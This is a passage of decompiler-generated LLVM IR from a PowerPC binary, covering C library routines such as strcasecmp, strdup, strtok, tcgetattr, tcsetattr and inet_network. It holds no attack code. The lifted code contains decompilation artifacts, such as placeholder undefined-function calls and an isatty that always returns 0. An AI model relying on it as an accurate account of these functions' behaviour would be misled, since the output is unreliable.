  store i32 %v1_1000d64c, i32* @r31, align 4
  %v1_1000d650 = load i32, i32* @r29, align 4
  %v3_1000d650 = icmp ugt i32 %v1_1000d64c, %v1_1000d650
  br i1 %v3_1000d650, label %dec_label_pc_1000d658, label %dec_label_pc_1000d660

dec_label_pc_1000d658:                            ; preds = %dec_label_pc_1000d630
  store i32 %v1_1000d650, i32* @r31, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000d660

dec_label_pc_1000d660:                            ; preds = %dec_label_pc_1000d630, %dec_label_pc_1000d658
  %v0_1000d670 = phi i32 [ %v1_1000d650, %dec_label_pc_1000d658 ], [ %v1_1000d64c, %dec_label_pc_1000d630 ]
  %v3_1000d660 = icmp eq i32 %v0_1000d670, 0
  br i1 %v3_1000d660, label %dec_label_pc_1000d684, label %dec_label_pc_1000d668

dec_label_pc_1000d668:                            ; preds = %dec_label_pc_1000d660
  %v0_1000d668 = load i32, i32* @r30, align 4
  store i32 %v0_1000d668, i32* @r4, align 4
  %v0_1000d66c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000d66c, i32* @r3, align 4
  store i32 %v0_1000d670, i32* @r5, align 4
  store i32 268490360, i32* @lr, align 4
  %v0_1000d674 = call i32 @memcpy()
  %v1_1000d678 = load i32, i32* @r31, align 4
  %v2_1000d678 = add i32 %v1_1000d678, %v0_1000d66c
  %v3_1000d680 = add i32 %v2_1000d678, -1
  %v4_1000d680 = inttoptr i32 %v3_1000d680 to i8*
  store i8 0, i8* %v4_1000d680, align 1
  br label %dec_label_pc_1000d684

dec_label_pc_1000d684:                            ; preds = %dec_label_pc_1000d660, %dec_label_pc_1000d668
  %v0_1000d684 = load i32, i32* %r28.global-to-local, align 4
  %v3_1000d684 = icmp eq i32 %v0_1000d684, 0
  br i1 %v3_1000d684, label %dec_label_pc_1000d694, label %dec_label_pc_1000d68c

dec_label_pc_1000d68c:                            ; preds = %dec_label_pc_1000d684
  %v0_1000d68c = call i32 @__errno_location()
  %v0_1000d690 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d690 = inttoptr i32 %v0_1000d68c to i32*
  store i32 %v0_1000d690, i32* %v2_1000d690, align 4
  %v0_1000d698.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000d694

dec_label_pc_1000d694:                            ; preds = %dec_label_pc_1000d684, %dec_label_pc_1000d68c
  %v0_1000d698 = phi i32 [ 0, %dec_label_pc_1000d684 ], [ %v0_1000d698.pre, %dec_label_pc_1000d68c ]
  ret i32 %v0_1000d698

; uselistorder directives
  uselistorder i32 %v2_1000d63c, { 1, 0 }
  uselistorder i32 %v4_1000d630, { 1, 0 }
  uselistorder i32 %v1_1000d638, { 1, 2, 0 }
  uselistorder i32 %v0_1000d5a0, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 4, 3, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 1, 0 }
  uselistorder label %dec_label_pc_1000d694, { 1, 0 }
  uselistorder label %dec_label_pc_1000d684, { 1, 0 }
  uselistorder label %dec_label_pc_1000d660, { 1, 0 }
  uselistorder label %dec_label_pc_1000d630, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5d0, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000d6b8 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000d6b8
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1000d6c0 = load i32, i32* bitcast (i32** @global_var_1002efb4.418 to i32*), align 4
  store i32 %v3_1000d6c0, i32* @r10, align 4
  %v0_1000d6c8.pre = load i32, i32* @r3, align 4
  %v1_1000d6c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000d6c8

dec_label_pc_1000d6c8:                            ; preds = %dec_label_pc_1000d6f0, %entry
  %v0_1000d7046 = phi i32 [ %v0_1000d7047, %dec_label_pc_1000d6f0 ], [ 0, %entry ]
  %v0_1000d6f4 = phi i32 [ %v1_1000d6f4, %dec_label_pc_1000d6f0 ], [ %v1_1000d6c8.pre, %entry ]
  %v0_1000d6f8 = phi i32 [ %v1_1000d6f8, %dec_label_pc_1000d6f0 ], [ %v0_1000d6c8.pre, %entry ]
  %v4_1000d6c8 = icmp eq i32 %v0_1000d6f8, %v0_1000d6f4
  %.pre = inttoptr i32 %v0_1000d6f8 to i8*
  br i1 %v4_1000d6c8, label %dec_label_pc_1000d6f0, label %dec_label_pc_1000d6d0

dec_label_pc_1000d6d0:                            ; preds = %dec_label_pc_1000d6c8
  %v2_1000d6d0 = load i8, i8* %.pre, align 1
  %v3_1000d6d0 = zext i8 %v2_1000d6d0 to i32
  %v1_1000d6d4 = inttoptr i32 %v0_1000d6f4 to i8*
  %v2_1000d6d4 = load i8, i8* %v1_1000d6d4, align 1
  %v3_1000d6d4 = zext i8 %v2_1000d6d4 to i32
  %v1_1000d6d8 = mul nuw nsw i32 %v3_1000d6d0, 2
  %v1_1000d6dc = mul nuw nsw i32 %v3_1000d6d4, 2
  %v2_1000d6e0 = add i32 %v1_1000d6d8, %v3_1000d6c0
  %v3_1000d6e0 = inttoptr i32 %v2_1000d6e0 to i16*
  %v4_1000d6e0 = load i16, i16* %v3_1000d6e0, align 2
  %v5_1000d6e0 = sext i16 %v4_1000d6e0 to i32
  %v2_1000d6e4 = add i32 %v1_1000d6dc, %v3_1000d6c0
  %v3_1000d6e4 = inttoptr i32 %v2_1000d6e4 to i16*
  %v4_1000d6e4 = load i16, i16* %v3_1000d6e4, align 2
  %v5_1000d6e4 = sext i16 %v4_1000d6e4 to i32
  %v2_1000d6e8 = sub nsw i32 %v5_1000d6e0, %v5_1000d6e4
  %v4_1000d6ec = icmp eq i16 %v4_1000d6e0, %v4_1000d6e4
  br i1 %v4_1000d6ec, label %dec_label_pc_1000d6f0, label %dec_label_pc_1000d704

dec_label_pc_1000d6f0:                            ; preds = %dec_label_pc_1000d6c8, %dec_label_pc_1000d6d0
  %v0_1000d7047 = phi i32 [ %v2_1000d6e8, %dec_label_pc_1000d6d0 ], [ %v0_1000d7046, %dec_label_pc_1000d6c8 ]
  %v2_1000d6f0 = load i8, i8* %.pre, align 1
  %v1_1000d6f4 = add i32 %v0_1000d6f4, 1
  %v1_1000d6f8 = add i32 %v0_1000d6f8, 1
  %v3_1000d6fc = icmp eq i8 %v2_1000d6f0, 0
  br i1 %v3_1000d6fc, label %dec_label_pc_1000d704, label %dec_label_pc_1000d6c8

dec_label_pc_1000d704:                            ; preds = %dec_label_pc_1000d6f0, %dec_label_pc_1000d6d0
  %v0_1000d704 = phi i32 [ %v0_1000d7047, %dec_label_pc_1000d6f0 ], [ %v2_1000d6e8, %dec_label_pc_1000d6d0 ]
  ret i32 %v0_1000d704

; uselistorder directives
  uselistorder i32 %v2_1000d6e8, { 1, 0 }
  uselistorder i32 %v0_1000d6f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d6f0, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_1000d720 = call i32 @__GI_strlen()
  %v1_1000d724 = add i32 %v0_1000d720, 1
  store i32 %v1_1000d724, i32* @r29, align 4
  store i32 %v1_1000d724, i32* @r3, align 4
  store i32 268490544, i32* @lr, align 4
  %v0_1000d72c = call i32 @malloc()
  store i32 %v0_1000d72c, i32* @r3, align 4
  %v0_1000d730 = load i32, i32* @r28, align 4
  store i32 %v0_1000d730, i32* @r4, align 4
  store i32 %v0_1000d72c, i32* @r31, align 4
  %v3_1000d734 = icmp eq i32 %v0_1000d72c, 0
  %v0_1000d738 = load i32, i32* @r29, align 4
  store i32 %v0_1000d738, i32* @r5, align 4
  br i1 %v3_1000d734, label %dec_label_pc_1000d744, label %dec_label_pc_1000d740

dec_label_pc_1000d740:                            ; preds = %entry
  store i32 268490564, i32* @lr, align 4
  %v0_1000d740 = call i32 @memcpy()
  %v0_1000d748.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d744

dec_label_pc_1000d744:                            ; preds = %entry, %dec_label_pc_1000d740
  %v0_1000d748 = phi i32 [ 0, %entry ], [ %v0_1000d748.pre, %dec_label_pc_1000d740 ]
  ret i32 %v0_1000d748

; uselistorder directives
  uselistorder label %dec_label_pc_1000d744, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1002f060.419 to i32), i32* @r5, align 4
  %v1_1000d764 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_1002f060.419 to i32))
  ret i32 %v1_1000d764
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268490620, i32* @lr, align 4
  %v2_1000d778 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000d7a4 = call i32 @ioctl(i32 536900637, i32 1, i32 1)
  ret i32 %v3_1000d7a4
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_2()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000d7ac = load i32, i32* @lr, align 4
  store i32 %v0_1000d7ac, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000d7bc = ptrtoint i32* %stack_var_-56 to i32
  store i32 268490704, i32* @lr, align 4
  %v3_1000d7cc = call i32 @ioctl(i32 1076655123, i32 %v2_1000d7bc, i32 %v2_1000d7bc)
  %v2_1000d7d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000d7d0, i32* @r4, align 4
  store i32 %v3_1000d7cc, i32* @r30, align 4
  %v3_1000d7d4 = icmp eq i32 %v3_1000d7cc, 0
  store i32 19, i32* @r5, align 4
  %v0_1000d7dc = load i32, i32* @r31, align 4
  br i1 %v3_1000d7d4, label %dec_label_pc_1000d7e4, label %dec_label_pc_1000d82c

dec_label_pc_1000d7e4:                            ; preds = %entry
  %v1_1000d7dc = add i32 %v0_1000d7dc, 17
  %v4_1000d7f0 = zext i8 %tmp4 to i32
  store i32 %v4_1000d7f0, i32* @r8, align 4
  %v3_1000d7fc = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000d7fc, i32* %r0.global-to-local, align 4
  %v2_1000d800 = add i32 %v0_1000d7dc, 4
  %v3_1000d800 = inttoptr i32 %v2_1000d800 to i32*
  store i32 %tmp7, i32* %v3_1000d800, align 4
  %v0_1000d804 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d804 = load i32, i32* @r31, align 4
  %v2_1000d804 = inttoptr i32 %v1_1000d804 to i32*
  store i32 %v0_1000d804, i32* %v2_1000d804, align 4
  %v0_1000d808 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d808 = load i32, i32* @r31, align 4
  %v2_1000d808 = add i32 %v1_1000d808, 8
  %v3_1000d808 = inttoptr i32 %v2_1000d808 to i32*
  store i32 %v0_1000d808, i32* %v3_1000d808, align 4
  %v0_1000d80c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d80c = load i32, i32* @r31, align 4
  %v2_1000d80c = add i32 %v1_1000d80c, 12
  %v3_1000d80c = inttoptr i32 %v2_1000d80c to i32*
  store i32 %v0_1000d80c, i32* %v3_1000d80c, align 4
  %v3_1000d810 = load i32, i32* @r31, align 4
  %v4_1000d810 = add i32 %v3_1000d810, 16
  %v5_1000d810 = inttoptr i32 %v4_1000d810 to i8*
  store i8 %tmp4, i8* %v5_1000d810, align 1
  %v1_1000d814 = load i32, i32* @r31, align 4
  %v2_1000d814 = add i32 %v1_1000d814, 52
  %v3_1000d814 = inttoptr i32 %v2_1000d814 to i32*
  store i32 %tmp3, i32* %v3_1000d814, align 4
  %v1_1000d818 = load i32, i32* @r31, align 4
  %v2_1000d818 = add i32 %v1_1000d818, 56
  %v3_1000d818 = inttoptr i32 %v2_1000d818 to i32*
  store i32 %tmp2, i32* %v3_1000d818, align 4
  store i32 268490784, i32* @lr, align 4
  %v6_1000d81c = sext i8 %tmp4 to i32
  %v8_1000d81c = call i32 @__GI_mempcpy(i32 %v1_1000d7dc, i32 %v2_1000d7d0, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000d81c, i32 %tmp7)
  store i32 268490796, i32* @lr, align 4
  %v3_1000d828 = call i32 @__GI_memset(i32 %v8_1000d81c, i32 0, i32 13)
  %v0_1000d830.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d82c

dec_label_pc_1000d82c:                            ; preds = %entry, %dec_label_pc_1000d7e4
  %v0_1000d830 = phi i32 [ %v3_1000d7cc, %entry ], [ %v0_1000d830.pre, %dec_label_pc_1000d7e4 ]
  store i32 %v0_1000d7ac, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d830

; uselistorder directives
  uselistorder i32 %v2_1000d7bc, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i8 %tmp4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d82c, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000d844 = load i32, i32* @r4, align 4
  %v3_1000d844 = icmp eq i32 %v0_1000d844, 1
  %v0_1000d854 = load i32, i32* @r3, align 4
  store i32 %v0_1000d854, i32* @r27, align 4
  %v0_1000d85c = load i32, i32* @r5, align 4
  store i32 %v0_1000d85c, i32* @r31, align 4
  br i1 %v3_1000d844, label %dec_label_pc_1000d880, label %dec_label_pc_1000d864

dec_label_pc_1000d864:                            ; preds = %entry
  %v3_1000d864 = icmp eq i32 %v0_1000d844, 2
  br i1 %v3_1000d864, label %dec_label_pc_1000d8a0, label %dec_label_pc_1000d86c

dec_label_pc_1000d86c:                            ; preds = %dec_label_pc_1000d864
  %v3_1000d86c = icmp eq i32 %v0_1000d844, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000d86c, label %dec_label_pc_1000d8a8, label %dec_label_pc_1000d88c

dec_label_pc_1000d880:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000d8a8

dec_label_pc_1000d88c:                            ; preds = %dec_label_pc_1000d86c
  %v0_1000d88c = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000d898 = inttoptr i32 %v0_1000d88c to i32*
  store i32 22, i32* %v2_1000d898, align 4
  br label %dec_label_pc_1000d990

dec_label_pc_1000d8a0:                            ; preds = %dec_label_pc_1000d864
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000d8a8

dec_label_pc_1000d8a8:                            ; preds = %dec_label_pc_1000d86c, %dec_label_pc_1000d880, %dec_label_pc_1000d8a0
  %v1_1000d8a8 = inttoptr i32 %v0_1000d85c to i32*
  %v2_1000d8a8 = load i32, i32* %v1_1000d8a8, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000d8b0 = add i32 %v0_1000d85c, 4
  %v2_1000d8b0 = inttoptr i32 %v1_1000d8b0 to i32*
  %v3_1000d8b0 = load i32, i32* %v2_1000d8b0, align 4
  store i32 %v3_1000d8b0, i32* %r9.global-to-local, align 4
  %v1_1000d8b4 = add i32 %v0_1000d85c, 17
  store i32 %v1_1000d8b4, i32* @r4, align 4
  %v1_1000d8b8 = add i32 %v0_1000d85c, 8
  %v2_1000d8b8 = inttoptr i32 %v1_1000d8b8 to i32*
  %v3_1000d8b8 = load i32, i32* %v2_1000d8b8, align 4
  %v2_1000d8bc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000d8bc, i32* @r3, align 4
  %v2_1000d8c4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000d8c4, i32* @r26, align 4
  %v1_1000d8c8 = add i32 %v0_1000d85c, 16
  %v2_1000d8c8 = inttoptr i32 %v1_1000d8c8 to i8*
  %v3_1000d8c8 = load i8, i8* %v2_1000d8c8, align 1
  %v4_1000d8c8 = zext i8 %v3_1000d8c8 to i32
  store i32 %v4_1000d8c8, i32* @r8, align 4
  store i32 %v2_1000d8a8, i32* %stack_var_-72, align 4
  store i32 268490996, i32* @lr, align 4
  %v0_1000d8f0 = call i32 @memcpy()
  %v0_1000d8f4 = load i32, i32* @r27, align 4
  %v0_1000d8f8 = load i32, i32* @r30, align 4
  store i32 268491016, i32* @lr, align 4
  %v3_1000d904 = call i32 @ioctl(i32 %v0_1000d8f4, i32 %v0_1000d8f8, i32 %v2_1000d8c4)
  store i32 %v3_1000d904, i32* @r28, align 4
  %v3_1000d908 = icmp eq i32 %v3_1000d904, 0
  br i1 %v3_1000d908, label %dec_label_pc_1000d910, label %dec_label_pc_1000d990

dec_label_pc_1000d910:                            ; preds = %dec_label_pc_1000d8a8
  %v0_1000d910 = load i32, i32* @r30, align 4
  %v3_1000d914 = icmp eq i32 %v0_1000d910, -2144570348
  br i1 %v3_1000d914, label %dec_label_pc_1000d91c, label %dec_label_pc_1000d98c

dec_label_pc_1000d91c:                            ; preds = %dec_label_pc_1000d910
  %v0_1000d91c = call i32 @__errno_location()
  store i32 %v0_1000d91c, i32* @r29, align 4
  %v0_1000d92c = load i32, i32* @r27, align 4
  %v1_1000d934 = inttoptr i32 %v0_1000d91c to i32*
  %v2_1000d934 = load i32, i32* %v1_1000d934, align 4
  store i32 %v2_1000d934, i32* @r30, align 4
  store i32 268491072, i32* @lr, align 4
  %v3_1000d93c = call i32 @ioctl(i32 %v0_1000d92c, i32 1076655123, i32 %v2_1000d8c4)
  %v3_1000d940 = icmp eq i32 %v3_1000d93c, 0
  br i1 %v3_1000d940, label %dec_label_pc_1000d950, label %dec_label_pc_1000d948

dec_label_pc_1000d948:                            ; preds = %dec_label_pc_1000d91c
  %v0_1000d948 = load i32, i32* @r30, align 4
  %v1_1000d948 = load i32, i32* @r29, align 4
  %v2_1000d948 = inttoptr i32 %v1_1000d948 to i32*
  store i32 %v0_1000d948, i32* %v2_1000d948, align 4
  br label %dec_label_pc_1000d990

dec_label_pc_1000d950:                            ; preds = %dec_label_pc_1000d91c
  %v0_1000d950 = load i32, i32* @r31, align 4
  %v1_1000d950 = add i32 %v0_1000d950, 8
  %v2_1000d950 = inttoptr i32 %v1_1000d950 to i32*
  %v3_1000d950 = load i32, i32* %v2_1000d950, align 4
  %v1_1000d958 = call i32 @__asm_rlwinm(i32 %v3_1000d950, i32 0, i32 19, i32 20)
  %v1_1000d95c = call i32 @__asm_rlwinm(i32 %v3_1000d8b8, i32 0, i32 19, i32 20)
  store i32 %v1_1000d95c, i32* %r9.global-to-local, align 4
  %v4_1000d960 = icmp eq i32 %v1_1000d958, %v1_1000d95c
  br i1 %v4_1000d960, label %dec_label_pc_1000d968, label %dec_label_pc_1000d97c

dec_label_pc_1000d968:                            ; preds = %dec_label_pc_1000d950
  %v1_1000d968 = and i32 %v3_1000d950, 768
  store i32 %v1_1000d968, i32* %r9.global-to-local, align 4
  %v3_1000d968 = icmp eq i32 %v1_1000d968, 0
  br i1 %v3_1000d968, label %dec_label_pc_1000d98c, label %dec_label_pc_1000d970

dec_label_pc_1000d970:                            ; preds = %dec_label_pc_1000d968
  %v1_1000d970 = call i32 @__asm_rlwinm(i32 %v3_1000d8b8, i32 0, i32 22, i32 23)
  %v0_1000d974 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000d974 = icmp eq i32 %v0_1000d974, %v1_1000d970
  br i1 %v4_1000d974, label %dec_label_pc_1000d98c, label %dec_label_pc_1000d97c

dec_label_pc_1000d97c:                            ; preds = %dec_label_pc_1000d950, %dec_label_pc_1000d970
  store i32 -1, i32* @r28, align 4
  %v1_1000d984 = load i32, i32* @r29, align 4
  %v2_1000d984 = inttoptr i32 %v1_1000d984 to i32*
  store i32 22, i32* %v2_1000d984, align 4
  br label %dec_label_pc_1000d990

dec_label_pc_1000d98c:                            ; preds = %dec_label_pc_1000d910, %dec_label_pc_1000d970, %dec_label_pc_1000d968
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000d990

dec_label_pc_1000d990:                            ; preds = %dec_label_pc_1000d8a8, %dec_label_pc_1000d97c, %dec_label_pc_1000d88c, %dec_label_pc_1000d948, %dec_label_pc_1000d98c
  %v0_1000d994 = load i32, i32* @r28, align 4
  ret i32 %v0_1000d994

; uselistorder directives
  uselistorder i32 %v0_1000d85c, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000d990, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_1000d98c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d97c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d8a8, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000d9a8 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d9a8
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000d9ac = load i32, i32* @r3, align 4
  ret i32 %v0_1000d9ac
}

define i32 @htonl() local_unnamed_addr {
entry:
  %v0_1000d9b0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d9b0
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000d9b4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d9b4
}

define i32 @inet_network(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v0_1000d9cc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d9cc

dec_label_pc_1000d9cc:                            ; preds = %dec_label_pc_1000dabc, %entry
  %v0_1000d9e0 = phi i32 [ %v1_1000dabc, %dec_label_pc_1000dabc ], [ %v0_1000d9cc.pre, %entry ]
  %v1_1000d9cc = inttoptr i32 %v0_1000d9e0 to i8*
  %v2_1000d9cc = load i8, i8* %v1_1000d9cc, align 1
  %v3_1000d9cc = zext i8 %v2_1000d9cc to i32
  store i32 %v3_1000d9cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r8.global-to-local, align 4
  %v3_1000d9d8 = icmp eq i8 %v2_1000d9cc, 48
  store i1 %v3_1000d9d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d9d8, label %dec_label_pc_1000d9e0, label %dec_label_pc_1000da08

dec_label_pc_1000d9e0:                            ; preds = %dec_label_pc_1000d9cc
  %v1_1000d9e0 = add i32 %v0_1000d9e0, 1
  %v2_1000d9e0 = inttoptr i32 %v1_1000d9e0 to i8*
  %v3_1000d9e0 = load i8, i8* %v2_1000d9e0, align 1
  %v4_1000d9e0 = zext i8 %v3_1000d9e0 to i32
  store i32 %v4_1000d9e0, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d9e0, i32* @r3, align 4
  %v3_1000d9e4 = icmp eq i8 %v3_1000d9e0, 120
  store i1 %v3_1000d9e4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d9e4, label %dec_label_pc_1000d9fc, label %dec_label_pc_1000d9ec

dec_label_pc_1000d9ec:                            ; preds = %dec_label_pc_1000d9e0
  %v3_1000d9ec = icmp eq i8 %v3_1000d9e0, 88
  store i1 %v3_1000d9ec, i1* %cr7_eq.global-to-local, align 1
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 8, i32* %r8.global-to-local, align 4
  br i1 %v3_1000d9ec, label %dec_label_pc_1000d9fc, label %dec_label_pc_1000da08

dec_label_pc_1000d9fc:                            ; preds = %dec_label_pc_1000d9ec, %dec_label_pc_1000d9e0
  %v1_1000d9fc = add i32 %v0_1000d9e0, 2
  store i32 %v1_1000d9fc, i32* @r3, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 16, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000da08

dec_label_pc_1000da08:                            ; preds = %dec_label_pc_1000d9ec, %dec_label_pc_1000d9cc, %dec_label_pc_1000d9fc
  %v0_1000da805 = phi i32 [ %v1_1000d9e0, %dec_label_pc_1000d9ec ], [ %v0_1000d9e0, %dec_label_pc_1000d9cc ], [ %v1_1000d9fc, %dec_label_pc_1000d9fc ]
  %v0_1000da08 = phi i32 [ 8, %dec_label_pc_1000d9ec ], [ 10, %dec_label_pc_1000d9cc ], [ 16, %dec_label_pc_1000d9fc ]
  %v3_1000da08 = icmp eq i32 %v0_1000da08, 8
  store i1 %v3_1000da08, i1* %cr1_eq.global-to-local, align 1
  %v3_1000da0c = icmp eq i32 %v0_1000da08, 16
  store i1 %v3_1000da0c, i1* %cr6_eq.global-to-local, align 1
  %v3_1000da10 = load i32, i32* @global_var_1002efac, align 4
  store i32 %v3_1000da10, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000da80

dec_label_pc_1000da1c:                            ; preds = %dec_label_pc_1000da80
  %v1_1000da88 = mul nuw nsw i32 %v3_1000da80, 2
  %v1_1000da1c = load i32, i32* %r4.global-to-local, align 4
  %v2_1000da1c = add i32 %v1_1000da1c, %v1_1000da88
  %v3_1000da1c = inttoptr i32 %v2_1000da1c to i16*
  %v4_1000da1c = load i16, i16* %v3_1000da1c, align 2
  %v5_1000da1c = zext i16 %v4_1000da1c to i32
  %v1_1000da20 = mul i32 %v0_1000da20, 16
  store i32 %v1_1000da20, i32* %r10.global-to-local, align 4
  %v1_1000da24 = and i32 %v5_1000da1c, 8
  %v3_1000da24 = icmp eq i32 %v1_1000da24, 0
  store i1 %v3_1000da24, i1* %cr0_eq.global-to-local, align 1
  %v1_1000da28 = call i32 @__asm_rlwinm(i32 %v5_1000da1c, i32 28, i32 31, i32 31)
  %v1_1000da2c = call i32 @__asm_rlwinm(i32 %v5_1000da1c, i32 31, i32 31, i32 31)
  %v3_1000da30 = icmp eq i32 %v1_1000da28, 0
  store i1 %v3_1000da30, i1* %cr7_eq.global-to-local, align 1
  %not.v2_1000da34 = icmp eq i32 %v1_1000da2c, 0
  %v6_1000da38 = sext i1 %not.v2_1000da34 to i32
  %v1_1000da3c = call i32 @__asm_rlwinm(i32 %v6_1000da38, i32 0, i32 26, i32 26)
  %v1_1000da40 = add i32 %v1_1000da3c, -87
  %v0_1000da44 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000da44, label %dec_label_pc_1000da64, label %dec_label_pc_1000da48

dec_label_pc_1000da48:                            ; preds = %dec_label_pc_1000da1c
  %v0_1000da48 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000da48 = icmp ugt i32 %v0_1000da48, 55
  %v3_1000da48 = icmp eq i32 %v0_1000da48, 55
  store i1 %v3_1000da48, i1* %cr7_eq.global-to-local, align 1
  %v0_1000da4c = load i1, i1* %cr1_eq.global-to-local, align 1
  %brmerge.demorgan = and i1 %v2_1000da48, %v0_1000da4c
  br i1 %brmerge.demorgan, label %dec_label_pc_1000dacc, label %dec_label_pc_1000da54

dec_label_pc_1000da54:                            ; preds = %dec_label_pc_1000da48
  %v0_1000da54 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000da54 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000da54 = mul i32 %v1_1000da54, %v0_1000da54
  %v2_1000da58 = add i32 %v2_1000da54, %v0_1000da48
  %v1_1000da5c = add i32 %v2_1000da58, -48
  br label %dec_label_pc_1000da70

dec_label_pc_1000da64:                            ; preds = %dec_label_pc_1000da1c
  %v0_1000da64 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000da64, label %dec_label_pc_1000da68, label %dec_label_pc_1000da90

dec_label_pc_1000da68:                            ; preds = %dec_label_pc_1000da64
  %v0_1000da68 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000da68, label %dec_label_pc_1000da90, label %dec_label_pc_1000da6c

dec_label_pc_1000da6c:                            ; preds = %dec_label_pc_1000da68
  %v0_1000da6c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000da6c = add i32 %v0_1000da6c, %v1_1000da40
  br label %dec_label_pc_1000da70

dec_label_pc_1000da70:                            ; preds = %dec_label_pc_1000da54, %dec_label_pc_1000da6c
